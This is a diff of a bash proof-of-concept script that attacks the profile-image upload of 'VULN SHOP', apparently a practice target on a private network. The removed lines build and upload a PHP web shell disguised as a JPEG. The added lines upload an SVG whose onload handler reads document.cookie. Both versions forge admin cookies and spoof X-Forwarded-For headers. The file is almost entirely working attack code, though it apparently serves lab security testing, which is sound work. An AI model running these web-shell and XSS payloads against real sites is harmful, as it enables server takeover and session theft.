@@ -1,46 +1,42 @@
 #!/bin/bash
-# 파일 업로드 취약점 테스트 스크립트
-# 사용법: ./file-upload.sh [file_path]
+# Malicious File Upload Test PoC
+# Target: VULN SHOP Profile Image Upload
 
 TARGET="http://192.168.0.28:3000"
 MY_IP="10.0.0.101"
 
-echo "[*] 파일 업로드 취약점 테스트"
-echo "[*] 타겟: $TARGET/profile/upload"
+echo "[*] SVG XSS File Upload Test"
+echo "[*] Target: $TARGET/profile/upload"
 echo ""
 
-# 테스트용 PHP 웹쉘 생성
-SHELL_FILE="/tmp/test-shell.php"
-echo '<?php echo "Vulnerable!"; system($_GET["cmd"]); ?>' > "$SHELL_FILE"
+# Create malicious SVG
+cat > /tmp/xss.svg << 'EOF'
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
+  <rect width="100" height="100" fill="red"/>
+  <text x="10" y="50">XSS Test</text>
+</svg>
+EOF
 
-echo "[1] PHP 웹쉘 업로드 시도..."
-UPLOAD_RESULT=$(curl -s -X POST \
-    -H "X-Forwarded-For: $MY_IP" \
-    -H "Cookie: user=admin; isAdmin=true; user_id=1" \
-    -F "profile_image=@$SHELL_FILE;type=image/jpeg" \
-    "$TARGET/profile/upload")
+echo "[+] Created malicious SVG: /tmp/xss.svg"
+cat /tmp/xss.svg
+echo ""
 
-echo "[2] 업로드된 파일 확인..."
-PROFILE=$(curl -s -H "X-Forwarded-For: $MY_IP" \
-    -H "Cookie: user=admin; isAdmin=true; user_id=1" \
-    "$TARGET/profile")
+# Upload SVG
+echo "[+] Uploading SVG..."
+curl -s -X POST -H "X-Forwarded-For: $MY_IP" \
+  -H "Cookie: user=admin; isAdmin=true; user_id=1" \
+  -F "profile_image=@/tmp/xss.svg" \
+  "$TARGET/profile/upload" | grep -E "(success|error|uploads)"
 
-UPLOADED_PATH=$(echo "$PROFILE" | grep -oP 'src="/uploads/[^"]+' | sed 's/src="//')
+echo ""
 
-if [ -n "$UPLOADED_PATH" ]; then
-    echo "[+] 업로드 성공: $UPLOADED_PATH"
-    echo ""
-    echo "[3] 업로드된 파일 내용 확인..."
-    CONTENT=$(curl -s -H "X-Forwarded-For: $MY_IP" "$TARGET$UPLOADED_PATH")
-    echo "$CONTENT"
+# Verify upload
+echo "[+] Verifying uploaded file..."
+curl -s -I -H "X-Forwarded-For: $MY_IP" "$TARGET/uploads/xss.svg" | grep -E "(Content-Type|HTTP)"
 
-    if echo "$CONTENT" | grep -q "system"; then
-        echo ""
-        echo "[+] 위험! 악성 파일이 필터링 없이 업로드되었습니다."
-    fi
-else
-    echo "[-] 업로드 경로를 찾을 수 없습니다."
-fi
+echo ""
+echo "[+] Fetching uploaded SVG content..."
+curl -s -H "X-Forwarded-For: $MY_IP" "$TARGET/uploads/xss.svg"
 
-# 정리
-rm -f "$SHELL_FILE"
+echo ""
+echo "[*] If Content-Type is image/svg+xml, XSS will execute in browser!"
